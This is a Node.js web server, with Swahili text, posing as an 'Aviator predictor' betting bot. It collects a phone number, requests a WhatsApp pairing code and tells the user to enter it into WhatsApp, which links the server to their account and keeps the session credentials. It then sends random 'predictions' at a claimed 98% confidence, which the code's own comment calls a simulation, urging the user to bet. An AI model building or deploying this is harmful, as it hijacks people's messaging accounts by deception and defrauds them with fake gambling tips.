const express = require('express');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>AVIATOR PREDATOR BOT</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Courier New', monospace; background: #000; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .card { background: #111; padding: 30px; border-radius: 10px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #ff0000; box-shadow: 0 0 15px #ff0000; }
                h2 { color: #ff0000; text-shadow: 2px 2px #500; }
                input { width: 100%; padding: 12px; margin: 15px 0; background: #222; color: #ff0000; border: 1px solid #ff0000; border-radius: 5px; font-weight: bold; }
                button { width: 100%; padding: 12px; background: #ff0000; color: #000; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
                #code { font-size: 30px; margin: 20px 0; letter-spacing: 5px; color: #fff; }
                .status { font-size: 12px; color: #888; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>AVIATOR PREDICTOR v3.0</h2>
                <p class="status">SYSTEM STATUS: READY TO HACK...</p>
                <input type="text" id="num" placeholder="255XXXXXXXXX">
                <button onclick="getPair()">ACTIVATE BOT</button>
                <div id="code"></div>
                <p id="msg" class="status"></p>
            </div>
            <script>
                async function getPair() {
                    const n = document.getElementById('num').value.replace(/[^0-9]/g, '');
                    if(!n) return alert('Ingiza namba!');
                    document.getElementById('msg').innerText = "Inatengeneza muunganiko...";
                    const r = await fetch('/get-code?num=' + n);
                    const d = await r.json();
                    document.getElementById('code').innerText = d.code || "RETRY";
                    document.getElementById('msg').innerText = "Weka kodi hii kwenye WhatsApp kisha subiri utabiri DM.";
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/get-code', async (req, res) => {
    let num = req.query.num;
    const sessionPath = path.join('/tmp', 'predator-' + num);
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "fatal" }),
        browser: ["Aviator-Predator", "MacOS", "10.15.7"]
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection } = update;
        if (connection === 'open') {
            const sessionID = Buffer.from(JSON.stringify(state.creds)).toString('base64');
            
            // 1. Tuma Session ID kwanza
            await sock.sendMessage(sock.user.id, { text: "*BOT ACTIVATED! ✅*\n\nSession ID: " + sessionID });

            // 2. Anza kutuma "Predictor Results" (Simulation)
            setInterval(async () => {
                const odds = (Math.random() * (5.5 - 1.2) + 1.2).toFixed(2); // Inazalisha odds kati ya 1.20 na 5.50
                const time = new Date().toLocaleTimeString();
                
                await sock.sendMessage(sock.user.id, { 
                    text: `*🚀 AVIATOR PREDICTION*\n\n*Next Round:* ${odds}x\n*Confidence:* 98%\n*Time:* ${time}\n\n_Weka bet yako sasa!_` 
                });
            }, 60000); // Inatuma kila baada ya dakika 1 (sekunde 60,000)
        }
    });

    if (!sock.authState.creds.registered) {
        await delay(2000);
        let code = await sock.requestPairingCode(num);
        res.json({ code });
    }
});

app.listen(PORT, () => console.log(`Aviator Predator Active!`));
